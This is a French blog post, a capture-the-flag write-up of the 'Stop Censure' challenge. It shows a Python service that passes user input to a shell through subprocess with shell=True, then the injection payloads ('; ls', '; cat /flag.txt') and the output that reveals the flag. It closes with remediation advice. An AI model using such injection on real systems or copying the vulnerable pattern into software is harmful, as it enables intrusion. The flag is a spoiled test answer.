---

layout: post  
title: Stop Censure  
subtitle: Write-Up pour le Nobrackets CTF  
tags: [writeup, injection, command, CTF]  
comments: true

---

Salut ! Voici mon write-up sur le challenge **Stop Censure** du Nobrackets CTF. Ce challenge exploite une vulnérabilité d'injection de commande, à travers l'utilisation de `subprocess`. Merci à `Drahoxx` ! 

## Premier coup d'œil

Le challenge nous demande de vérifier si un site est censuré ou non via un service accessible en utilisant `netcat`. Voici comment accéder au service :

```bash
nc node1.nobrackets.fr 20764
```

Une fois connecté, on nous demande de saisir une URL pour vérifier si elle est bloquée. L'objectif est d'exploiter cette interface pour accéder au fichier `/flag.txt`.

## Analyse du code

Voici le code source du service `chall.py` fourni :

```python
#!/usr/bin/env python3
import subprocess
import re

# Regex qui détermine les sites légaux
pattern = r'https?://[a-zA-Z0-9.-]+\.nobrackets\.fr(/[a-zA-Z0-9./?%_-]*)?'

# Fonction de vérification de la légalité d'une url
def is_legal_url(url):
    return re.match(pattern, url) is not None

# Bannière
print("----------------------------")
print("~~ Ce site est-il légal ? ~~")
print("----------------------------")

# Entrée utilisateur
value = input("Entrez un site (eg: https://wiki.nobrackets.fr/) >>> ")

# Vérification que l'entrée utilisateur ne soit pas vide
if not value:
    print("Erreur. Veuillez entrer une URL.")
    exit(-1)

# Vérification de la légalité de l'URL entrée
if not is_legal_url(value):
    print("Erreur. Votre URL est soit mal formatée soit illégale !")
    exit(-1)

# Test de l'existence du site
process = subprocess.run("curl -I "+value, capture_output=True, shell=True)
res = process.stdout
if not res:
    print("Erreur. Le site ne semble pas exister.")
    exit(-1)

# Affichage de l'échange
print("Succès ! Le site est légal et fonctionnel ! Voici ses informations : \n\n")
print(res.decode())
exit(0)
```

Le programme utilise `subprocess.run()` pour exécuter la commande `curl` et tester si l'URL existe. Toutefois, le problème réside dans l'utilisation de l'option `shell=True` avec la commande construite à partir de l'entrée utilisateur. Cela permet une injection de commande si la saisie utilisateur n'est pas correctement contrôlée.

## Exploitation

Pour tester si l'injection de commande fonctionne, j'ai essayé de lister les fichiers avec une commande `ls` :

```bash
nc node1.nobrackets.fr 20764
Entrez un site (eg: https://wiki.nobrackets.fr/) >>> https://wiki.nobrackets.fr; ls
```

L'output est le suivant :

```bash
Succès ! Le site est légal et fonctionnel ! Voici ses informations :

HTTP/2 200 
server: GitHub.com
content-type: text/html; charset=utf-8
last-modified: Fri, 11 Oct 2024 22:00:15 GMT
access-control-allow-origin: *
etag: "67099fef-a60b"
expires: Thu, 17 Oct 2024 16:28:13 GMT
cache-control: max-age=600
x-proxy-cache: MISS
x-github-request-id: 5066:0DB5:E147C0:E7B1C4:671138C4
accept-ranges: bytes
date: Thu, 17 Oct 2024 17:58:50 GMT
via: 1.1 varnish
age: 0
x-served-by: cache-par-lfpg1960039-PAR
x-cache: HIT
x-cache-hits: 1
x-timer: S1729187930.281473,VS0,VE129
vary: Accept-Encoding
x-fastly-request-id: 561b2b3cd07d5177045d938ec4be4fc947ef1304
content-length: 42507

chall.py
```

Nous pouvons voir que la commande `ls` a bien été exécutée et que le fichier `chall.py` est listé dans le répertoire.

### Accès au Flag

L'étape suivante consiste à injecter une commande pour lire le fichier `/flag.txt`. Voici la commande complète :

```bash
Entrez un site (eg: https://wiki.nobrackets.fr/) >>> https://wiki.nobrackets.fr; cat /flag.txt
```

Voici l'output obtenu :

```bash
Succès ! Le site est légal et fonctionnel ! Voici ses informations :

HTTP/2 200 
server: GitHub.com
content-type: text/html; charset=utf-8
last-modified: Fri, 11 Oct 2024 22:00:15 GMT
access-control-allow-origin: *
etag: "67099fef-a60b"
expires: Thu, 17 Oct 2024 16:28:13 GMT
cache-control: max-age=600
x-proxy-cache: MISS
x-github-request-id: 5066:0DB5:E147C0:E7B1C4:671138C4
accept-ranges: bytes
age: 106
date: Thu, 17 Oct 2024 18:00:36 GMT
via: 1.1 varnish
x-served-by: cache-par-lfpg1960025-PAR
x-cache: HIT
x-cache-hits: 0
x-timer: S1729188037.902421,VS0,VE1
vary: Accept-Encoding
x-fastly-request-id: b7bb977154518a58b081de81a79f9fc6db83fd4d
content-length: 42507

NBCTF{#FreeTheInternet}
```

Le flag est bien récupéré : **NBCTF{#FreeTheInternet}**.

## Conclusion

Ce challenge montre une autre forme d'injection de commande, cette fois-ci via la bibliothèque `subprocess` avec `shell=True`, qui permet à des utilisateurs malveillants d'exécuter des commandes arbitraires. Pour sécuriser ce type d'application, il est recommandé de désactiver `shell=True` et d'utiliser des commandes bien délimitées, tout en validant rigoureusement les entrées utilisateur.

Merci encore à `Drahoxx` pour ce challenge captivant !
